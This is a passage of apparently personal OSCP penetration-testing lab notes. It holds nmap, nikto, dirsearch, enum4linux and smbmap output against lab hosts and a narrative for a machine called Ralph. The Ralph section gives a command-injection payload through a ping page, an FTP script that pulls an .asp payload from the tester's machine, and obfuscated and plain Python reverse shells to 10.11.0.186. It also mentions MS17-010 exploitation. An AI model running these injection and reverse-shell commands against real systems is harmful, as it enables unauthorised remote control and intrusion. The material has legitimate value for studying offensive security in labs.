2008-04-25T02:02:48<br />|_Not valid after:  2008-05-25T02:02:48<br />|_ssl-date: 2019-11-21T01:35:17+00:00; +6s from scanner time.<br />| sslv2: <br />|   SSLv2 supported<br />|   ciphers: <br />|     SSL2_RC4_128_WITH_MD5<br />|     SSL2_RC4_128_EXPORT40_WITH_MD5<br />|     SSL2_RC2_128_CBC_WITH_MD5<br />|     SSL2_DES_192_EDE3_CBC_WITH_MD5<br />|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5<br />445/tcp open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)<br />993/tcp open  ssl/imap    Dovecot imapd<br />|_imap-capabilities: AUTH=PLAINA0001 IDLE completed SORT Capability MULTIAPPEND UNSELECT CHILDREN LITERAL+ SASL-IR IMAP4rev1 NAMESPACE OK THREAD=REFERENCES LOGIN-REFERRALS<br />| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX<br />| Not valid before: 2008-04-25T02:02:48<br />|_Not valid after:  2008-05-25T02:02:48<br />|_ssl-date: 2019-11-21T01:35:16+00:00; +5s from scanner time.<br />| sslv2: <br />|   SSLv2 supported<br />|   ciphers: <br />|     SSL2_RC4_128_WITH_MD5<br />|     SSL2_RC4_128_EXPORT40_WITH_MD5<br />|     SSL2_RC2_128_CBC_WITH_MD5<br />|     SSL2_DES_192_EDE3_CBC_WITH_MD5<br />|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5<br />995/tcp open  ssl/pop3    Dovecot pop3d<br />|_pop3-capabilities: CAPA UIDL TOP RESP-CODES USER PIPELINING SASL(PLAIN)<br />| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX<br />| Not valid before: 2008-04-25T02:02:48<br />|_Not valid after:  2008-05-25T02:02:48<br />|_ssl-date: 2019-11-21T01:35:17+00:00; +6s from scanner time.<br />| sslv2: <br />|   SSLv2 supported<br />|   ciphers: <br />|     SSL2_RC4_128_WITH_MD5<br />|     SSL2_RC4_128_EXPORT40_WITH_MD5<br />|     SSL2_RC2_128_CBC_WITH_MD5<br />|     SSL2_DES_192_EDE3_CBC_WITH_MD5<br />|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5<br />MAC Address: 00:50:56:89:56:69 (VMware)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Host script results:<br />|_clock-skew: mean: 50m05s, deviation: 2h02m28s, median: 5s<br />|_nbstat: NetBIOS name: PAYDAY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br />| smb-os-discovery: <br />|   OS: Unix (Samba 3.0.26a)<br />|   Computer name: payday<br />|   NetBIOS computer name: <br />|   Domain name: <br />|   FQDN: payday<br />|_  System time: 2019-11-20T20:35:17-05:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />|_smb2-time: Protocol negotiation failed (SMB2)<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 102.27 seconds<br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>nikto -host <a href="http://10.11.1.24:80">http://10.11.1.24:80</a> | tee nikto_10.11.1.24:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.11.1.24<br />+ Target Hostname:    10.11.1.24<br />+ Target Port:        80<br />+ Start Time:         2019-11-20 20:33:59 (GMT-5)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6<br />+ Retrieved x-powered-by header: PHP/5.2.3-1ubuntu6<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Cookie csid created without the httponly flag<br />+ Cookie cart_languageC created without the httponly flag<br />+ Cookie secondary_currencyC created without the httponly flag<br />+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is &quot;<a href="http://127.0.0.1/images/".">http://127.0.0.1/images/&quot;.</a><br />+ PHP/5.2.3-1ubuntu6 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.<br />+ Apache/2.2.4 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.<br />+ Uncommon header &#39;tcn&#39; found, with contents: list<br />+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See <a href="http://www.wisec.it/sectou.php?id=4698ebdc59d15.">http://www.wisec.it/sectou.php?id=4698ebdc59d15.</a> The following alternatives for &#39;index&#39; were found: index.php<br />+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE <br />+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.<br />+ DEBUG HTTP verb may show server debugging information. See <a href="http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx">http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx</a> for details.<br />+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST<br />+ Cookie acsid created without the httponly flag<br />+ Cookie cart_languageA created without the httponly flag<br />+ Cookie secondary_currencyA created without the httponly flag<br />+ /admin/config.php: PHP Config file may contain database IDs and passwords.<br />+ /admin/cplogfile.log: DevBB 1.0 final (<a href="http://www.mybboard.com)">http://www.mybboard.com)</a> log file is readable remotely. Upgrade to the latest version.<br />+ /admin/system_footer.php: myphpnuke version 1.8.8_final_7 reveals detailed system information.<br />+ /config.php: PHP Config file may contain database IDs and passwords.<br />+ /config/: Configuration information may be available remotely.<br />+ OSVDB-29786: /admin.php?en_log_id=0&amp;action=config: EasyNews from <a href="http://www.webrc.ca">http://www.webrc.ca</a> version 4.3 allows remote admin access. This PHP file should be protected.<br />+ OSVDB-29786: /admin.php?en_log_id=0&amp;action=users: EasyNews from <a href="http://www.webrc.ca">http://www.webrc.ca</a> version 4.3 allows remote admin access. This PHP file should be protected.<br />+ OSVDB-3233: /admin/admin_phpinfo.php4: Mon Album from <a href="http://www.3dsrc.com">http://www.3dsrc.com</a> version 0.6.2d allows remote admin access. This should be protected.<br />+ OSVDB-5034: /admin/login.php?action=insert&amp;username=test&amp;password=test: phpAuction may allow user admin accounts to be inserted without proper authentication. Attempt to log in with user &#39;test&#39; password &#39;test&#39; to verify.<br />+ OSVDB-376: /admin/contextAdmin/contextAdmin.html: Tomcat may be configured to let attackers read arbitrary files. Restrict access to /admin.<br />+ OSVDB-4804: //admin/admin.shtml: Axis network camera may allow admin bypass by using double-slashes before URLs.<br />+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ OSVDB-2813: /admin/database/wwForum.mdb: Web Wiz Forums pre 7.5 is vulnerable to Cross-Site Scripting attacks. Default login/pass is Administrator/letmein<br />+ OSVDB-2842: //admin/aindex.htm: FlexWATCH firmware 2.2 is vulnerable to authentication bypass by prepending an extra &#39;/&#39;. <a href="http://packetstorm.linuxsecurity.com/0310-exploits/FlexWATCH.txt">http://packetstorm.linuxsecurity.com/0310-exploits/FlexWATCH.txt</a><br />+ OSVDB-2922: /admin/wg_user-info.ml: WebGate Web Eye exposes user names and passwords.<br />+ OSVDB-3092: /admin.php: This might be interesting...<br />+ OSVDB-3092: /admin/: This might be interesting...<br />+ OSVDB-3092: /config/checks.txt: This might be interesting...<br />+ OSVDB-3092: /install/: This might be interesting...<br />+ OSVDB-3093: /admin/auth.php: This might be interesting... has been seen in web logs from an unknown scanner.<br />+ OSVDB-3093: /admin/cfg/configscreen.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.<br />+ OSVDB-3093: /admin/cfg/configsite.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.<br />+ OSVDB-3093: /admin/cfg/configsql.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.<br />+ OSVDB-3093: /admin/cfg/configtache.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.<br />+ OSVDB-3093: /admin/cms/htmltags.php: This might be interesting... has been seen in web logs from an unknown scanner.<br />+ OSVDB-3093: /admin/credit_card_info.php: This might be interesting... has been seen in web logs from an unknown scanner.<br />+ OSVDB-3093: /admin/exec.php3: This might be interesting... has been seen in web logs from an unknown scanner.<br />+ OSVDB-3093: /admin/index.php: This might be interesting... has been seen in web logs from an unknown scanner.<br />+ OSVDB-3093: /admin/modules/cache.php+: This might be interesting... has been seen in web logs from an unknown scanner.<br />+ OSVDB-3093: /admin/objects.inc.php4: This might be interesting... has been seen in web logs from an unknown scanner.<br />+ OSVDB-3093: /admin/script.php: This might be interesting... has been seen in web logs from an unknown scanner.<br />+ OSVDB-3093: /admin/settings.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.<br />+ OSVDB-3093: /admin/templates/header.php: This might be interesting... has been seen in web logs from an unknown scanner.<br />+ OSVDB-3093: /admin/upload.php: This might be interesting... has been seen in web logs from an unknown scanner.<br />+ OSVDB-3093: /config/html/cnf_gi.htm: This might be interesting... has been seen in web logs from an unknown scanner.<br />+ OSVDB-3268: /icons/: Directory indexing found.<br />+ OSVDB-4238: /admin/adminproc.asp: Xpede administration page may be available. The /admin directory should be protected.<br />+ OSVDB-4239: /admin/datasource.asp: Xpede page reveals SQL account name. The /admin directory should be protected.<br />+ OSVDB-9624: /admin/admin.php?adminpy=1: PY-Membres 4.2 may allow administrator access.<br />+ OSVDB-3092: /install/install.php: Install file found.<br />+ OSVDB-3092: /install.php: install.php file found.<br />+ Server leaks inodes via ETags, header found with file /icons/README, inode: 67942, size: 4872, mtime: Thu Jun 24 15:46:08 2010<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ /classes/phpmailer/class.cs_phpmailer.php?classes_dir=<a href="http://cirt.net/rfiinc.txt?:">http://cirt.net/rfiinc.txt?:</a> PHP include error may indicate local or remote file inclusion is possible.<br />+ /install.php?install_dir=<a href="http://cirt.net/rfiinc.txt?:">http://cirt.net/rfiinc.txt?:</a> PHP include error may indicate local or remote file inclusion is possible.<br />+ /config/config.txt: Configuration file found.<br />+ /config/readme.txt: Readme file found.<br />+ /admin/account.asp: Admin login page/section found.<br />+ /admin/account.html: Admin login page/section found.<br />+ /admin/account.php: Admin login page/section found.<br />+ /admin/controlpanel.asp: Admin login page/section found.<br />+ /admin/controlpanel.html: Admin login page/section found.<br />+ /admin/controlpanel.php: Admin login page/section found.<br />+ /admin/cp.asp: Admin login page/section found.<br />+ /admin/cp.html: Admin login page/section found.<br />+ /admin/cp.php: Admin login page/section found.<br />+ /admin/home.asp: Admin login page/section found.<br />+ /admin/home.php: Admin login page/section found.<br />+ /admin/index.asp: Admin login page/section found.<br />+ /admin/index.html: Admin login page/section found.<br />+ /admin/login.asp: Admin login page/section found.<br />+ /admin/login.html: Admin login page/section found.<br />+ /admin/login.php: Admin login page/section found.<br />+ /admin/html: Tomcat Manager / Host Manager interface found (pass protected)<br />+ /admin/status: Tomcat Server Status interface found (pass protected)<br />+ 8348 requests: 2 error(s) and 87 item(s) reported on remote host<br />+ End Time:           2019-11-20 20:43:17 (GMT-5) (558 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />root@kali:~/Desktop/Machines/OSCP/24# </div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/>python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://10.11.1.24:80">http://10.11.1.24:80</a> --simple-report dirsearchsimple_10.11.1.24:80<br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-11-20_20-34-00.log<br /><br />Target: <a href="http://10.11.1.24:80">http://10.11.1.24:80</a><br /><br />[20:34:01] Starting: <br />[20:34:01] 403 -  304B  - /cgi-bin/<br />[20:34:02] 200 -   29KB - /icons/<br />[20:34:03] 200 -    2KB - /image/<br />[20:34:03] 200 -    2KB - /image.php<br />[20:34:03] 403 -  300B  - /doc/<br />[20:34:03] 200 -  712B  - /catalog/<br />[20:34:04] 200 -    9KB - /admin/<br />[20:34:04] 200 -   27KB - /index.php<br />[20:34:04] 200 -    9KB - /admin.php<br />[20:34:04] 302 -    0B  - /images/  -&gt;  ../index.php<br />[20:34:05] 200 -   27KB - /index/<br />[20:34:05] 200 -    1KB - /skins/<br />[20:34:06] 302 -    0B  - /core/  -&gt;  ../index.php<br />[20:34:06] 200 -    8KB - /install.php<br />[20:34:06] 200 -    8KB - /install/<br />[20:34:08] 302 -    0B  - /include/  -&gt;  ../index.php<br />[20:34:11] 200 -    2KB - /classes/<br />[20:34:11] 200 -   13B  - /config.php<br />[20:34:11] 200 -   13B  - /config/<br />[20:34:28] 200 -    0B  - /chart.php<br />[20:34:28] 200 -    0B  - /chart/<br />[20:34:28] 302 -    0B  - /addons/  -&gt;  ../index.php<br />[20:34:31] 302 -    0B  - /var/  -&gt;  ../index.php<br />[20:34:42] 200 -    0B  - /payments/<br />[20:34:48] 200 -   13B  - /init.php<br />[20:34:48] 200 -   13B  - /init/<br />[20:34:52] 200 -    0B  - /prepare/<br />[20:34:52] 200 -    0B  - /prepare.php<br />[20:37:06] 200 -   13B  - /targets/<br />[20:42:37] 200 -   44B  - /apache2-default/<br />[20:43:20] 403 -  310B  - /server-status/<br /><br />Task Completed<br />root@kali:~/Desktop/Machines/OSCP/24# <br /></div><div class='page'><h1 class='title level-5'>proof</h1><br/>c19cf7756cfef80636d95d9e73ef4a2e<br /></div><div class='page'><h1 class='title level-5'>screenshot</h1><br/><a href=""><img src="images/444-1.png" alt="images/444-1.png" /></a></div><div class='page'><h1 class='title level-4'>31 Ralph</h1><br/>nmap showed that 80 and smb were open (as well as many others)<br />nikto and dirsearch gave me very little<br />smbmap with a -p gofuckyourself showed that there was a \_vti_pingit\pingit.py and .html<br /><a href="http://10.11.1.31/_vti_pingit/pingit.html">http://10.11.1.31/_vti_pingit/pingit.html</a> allowed you to ping an IP<br />give it a 10.11.0.186 &amp; whoami ....  BOOM code execution<br />using a python webshell worked but was trash, so we moved on to the ftp upload trick<br />start nc listener<br />standing up a python ftp server on my kali and makeing a file to pull from it on the target then navigating to that file did the trick!<br />whoami              nt authority\network service         ... damn<br />        ^^I never did figure out how to pirvesc from here^^<br />        <br />        <br />nmap vulnscan for smb showed that the machine was vulnerable to ms17-010. Metasploit reinforced this theory and got me root<br /><br /><br /><br /><br /><br /><br /><br />------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br /><br /><br />ON KALI<br />apt-get install python-pyftpdlib<br />python -m pyftpdlib -p 21 -w<br /><br />ON TARGET<br />echo import ftplib &gt; yeet.txt<br />echo ftp=ftplib.FTP(&#39;10.11.0.186&#39;) &gt;&gt; yeet.txt                                                          &lt;&lt;&lt;CHANGE IP<br />echo ftp.login(&#39;anonymous&#39;,&#39;x&#39;) &gt;&gt; yeet.txt<br />echo ftp.retrbinary(&#39;RETR 3232.asp&#39;,open(&#39;3232.asp&#39;,&#39;wb&#39;).write) &gt;&gt; yeet.txt           &lt;&lt;&lt;REPLACE FILES<br />echo ftp.quit() &gt;&gt; yeet.txt<br /><br />OR<br /><br />c:\python27\python.exe -c &quot;import ftplib;ftp=ftplib.FTP(&#39;10.11.0.186&#39;);ftp.login(&#39;anonymous&#39;,&#39;x&#39;);ftp.retrbinary(&#39;RETR 3232.asp&#39;,open(&#39;3232.asp&#39;,&#39;wb&#39;).write);ftp.quit()&quot;<br /><br />^^STILL CHANGE IP AND FILENAMES</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>10.11.0.186 &amp; C:\Python26\python.exe -c &quot;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#39;10.11.0.186&#39;, 443)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&#39;except&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type(&#39;try&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&#39;p2s_thread&#39;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&#39;s2p_thread&#39;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&#39;p&#39;] in [(subprocess.Popen([&#39;\\windows\\system32\\cmd.exe&#39;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&#39;s&#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#39;p2s&#39;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#39;s&#39;].send(__l[&#39;p&#39;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;p2s&#39;)]][0] for __g[&#39;s2p&#39;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#39;p&#39;].stdin.write(__l[&#39;data&#39;]), __after())[1] if (len(__l[&#39;data&#39;]) &gt; 0) else __after())(lambda: __this()) for __l[&#39;data&#39;] in [(__l[&#39;s&#39;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;s2p&#39;)]][0] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0] for __g[&#39;socket&#39;] in [(__import__(&#39;socket&#39;, __g, __g))]][0] for __g[&#39;subprocess&#39;] in [(__import__(&#39;subprocess&#39;, __g, __g))]][0] for __g[&#39;threading&#39;] in [(__import__(&#39;threading&#39;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#39;contextlib&#39;))&quot;<br /><br /><br /><br /><br /><br />C:\Python26\python.exe -c &quot;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#39;10.11.0.186&#39;, 3232)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&#39;except&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type(&#39;try&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&#39;p2s_thread&#39;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&#39;s2p_thread&#39;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&#39;p&#39;] in [(subprocess.Popen([&#39;\\windows\\system32\\cmd.exe&#39;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&#39;s&#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#39;p2s&#39;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#39;s&#39;].send(__l[&#39;p&#39;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;p2s&#39;)]][0] for __g[&#39;s2p&#39;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#39;p&#39;].stdin.write(__l[&#39;data&#39;]), __after())[1] if (len(__l[&#39;data&#39;]) &gt; 0) else __after())(lambda: __this()) for __l[&#39;data&#39;] in [(__l[&#39;s&#39;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;s2p&#39;)]][0] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0] for __g[&#39;socket&#39;] in [(__import__(&#39;socket&#39;, __g, __g))]][0] for __g[&#39;subprocess&#39;] in [(__import__(&#39;subprocess&#39;, __g, __g))]][0] for __g[&#39;threading&#39;] in [(__import__(&#39;threading&#39;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#39;contextlib&#39;))&quot;<br /><br /><br /><br />C:\python26\python.exe -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.11.0.186&quot;,3232));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;C:\windows\system32\cmd.exe&quot;)&#39;</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>nmap 10.11.1.31<br />Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-19 10:17 EST<br />Nmap scan report for 10.11.1.31<br />Host is up (0.051s latency).<br />Not shown: 993 closed ports<br />PORT     STATE SERVICE<br />80/tcp   open  http<br />135/tcp  open  msrpc<br />139/tcp  open  netbios-ssn<br />445/tcp  open  microsoft-ds<br />1025/tcp open  NFS-or-IIS<br />1433/tcp open  ms-sql-s<br />3389/tcp open  ms-wbt-server<br />MAC Address: 00:50:56:89:51:86 (VMware)<br /><br />Nmap done: 1 IP address (1 host up) scanned in 1.16 seconds<br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>nikto -host <a href="http://10.11.1.31:80">http://10.11.1.31:80</a> | tee nikto_10.11.1.31:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.11.1.31<br />+ Target Hostname:    10.11.1.31<br />+ Target Port:        80<br />+ Start Time:         2019-11-19 10:20:48 (GMT-5)<br />---------------------------------------------------------------------------<br />+ Server: Microsoft-IIS/6.0<br />+ Retrieved x-powered-by header: ASP.NET<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Cookie ASPSESSIONIDQCRSQDAC created without the httponly flag<br />+ Retrieved x-aspnet-version header: 1.1.4322<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ OSVDB-473: /_vti_pvt/access.cnf: Contains HTTP server-specific access control information. Remove or ACL if FrontPage is not being used.<br />+ OSVDB-473: /_vti_pvt/botinfs.cnf: FrontPage file found. This may contain useful information.<br />+ OSVDB-473: /_vti_pvt/bots.cnf: FrontPage file found. This may contain useful information.<br />+ OSVDB-473: /_vti_pvt/service.cnf: Contains meta-information about the web server Remove or ACL if FrontPage is not being used.<br />+ OSVDB-473: /_vti_pvt/services.cnf: Contains the list of subwebs. Remove or ACL if FrontPage is not being used. May reveal server version if Admin has changed it.<br />+ OSVDB-473: /_vti_pvt/writeto.cnf: Contains information about form handler result files. Remove or ACL if FrontPage is not being used.<br />+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.<br />+ OSVDB-3233: /_private/: FrontPage directory found.<br />+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).<br />+ /_vti_pvt/uniqperm.cnf: FrontPage/Sharepointfile available.<br />+ 7544 requests: 0 error(s) and 18 item(s) reported on remote host<br />+ End Time:           2019-11-19 11:36:45 (GMT-5) (4557 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-6'>enum4linux</h1><br/>root@kali:~/Desktop/Machines/OSCP/31# enum4linux -a 10.11.1.31<br />Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Tue Nov 19 11:59:03 2019<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 10.11.1.31<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> ================================================== <br />|    Enumerating Workgroup/Domain on 10.11.1.31    |<br /> ================================================== <br />[+] Got domain/workgroup name: THINC<br /><br /> ========================================== <br />|    Nbtstat Information for 10.11.1.31    |<br /> ========================================== <br />Looking up status of 10.11.1.31<br />	RALPH           &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service<br />	THINC           &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name<br />	RALPH           &lt;1f&gt; -         B &lt;ACTIVE&gt;  NetDDE Service<br />	RALPH           &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service<br />	RALPH           &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service<br />	THINC           &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections<br />	THINC           &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser<br />	..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser<br /><br />	MAC Address = 00-50-56-89-51-86<br /><br /> =================================== <br />|    Session Check on 10.11.1.31    |<br /> =================================== <br />[+] Server 10.11.1.31 allows sessions using username &#39;&#39;, password &#39;&#39;<br /><br /> ========================================= <br />|    Getting domain SID for 10.11.1.31    |<br /> ========================================= <br />Cannot connect to server.  Error was NT_STATUS_INVALID_PARAMETER<br />[+] Can&#39;t determine if host is part of domain or part of a workgroup<br /><br /> ==================================== <br />|    OS information on 10.11.1.31    |<br /> ==================================== <br />Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.<br />[+] Got OS info for 10.11.1.31 from smbclient: <br />[+] Got OS info for 10.11.1.31 from srvinfo:<br />Cannot connect to server.  Error was NT_STATUS_INVALID_PARAMETER<br /><br /> =========================== <br />|    Users on 10.11.1.31    |<br /> =========================== <br />Use of uninitialized value $users in print at ./enum4linux.pl line 874.<br />Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.<br /><br />Use of uninitialized value $users in print at ./enum4linux.pl line 888.<br />Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.<br /><br /> ======================================= <br />|    Share Enumeration on 10.11.1.31    |<br /> ======================================= <br />[E] Can&#39;t list shares: NT_STATUS_ACCESS_DENIED<br /><br />[+] Attempting to map shares on 10.11.1.31<br /><br /> ================================================== <br />|    Password Policy Information for 10.11.1.31    |<br /> ================================================== <br />[E] Unexpected error from polenum:<br /><br /><br />[+] Attaching to 10.11.1.31 using a NULL share<br /><br />[+] Trying protocol 445/SMB...<br /><br />	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.<br /><br />[+] Trying protocol 139/SMB...<br /><br />	[!] Protocol failed: Cannot request session (Called Name:10.11.1.31)<br /><br /><br />[+] Retieved partial password policy with rpcclient:<br /><br /><br /><br /> ============================ <br />|    Groups on 10.11.1.31    |<br /> ============================ <br /><br />[+] Getting builtin groups:<br /><br />[+] Getting builtin group memberships:<br /><br />[+] Getting local groups:<br /><br />[+] Getting local group memberships:<br /><br />[+] Getting domain groups:<br /><br />[+] Getting domain group memberships:<br /><br /> ===================================================================== <br />|    Users on 10.11.1.31 via RID cycling (RIDS: 500-550,1000-1050)    |<br /> ===================================================================== <br /><br /> =========================================== <br />|    Getting printer info for 10.11.1.31    |<br /> =========================================== <br />Cannot connect to server.  Error was NT_STATUS_INVALID_PARAMETER<br /><br /><br />enum4linux complete on Tue Nov 19 11:59:10 2019<br /></div><div class='page'><h1 class='title level-6'>smbmap</h1><br/>root@kali:~/Desktop/Machines/OSCP/31# smbmap -H 10.11.1.31 -R -p jhgfjhgfjgf -P 139<br />[+] Finding open SMB ports....<br />[+] Guest RPC session established on 10.11.1.31...<br />[+] 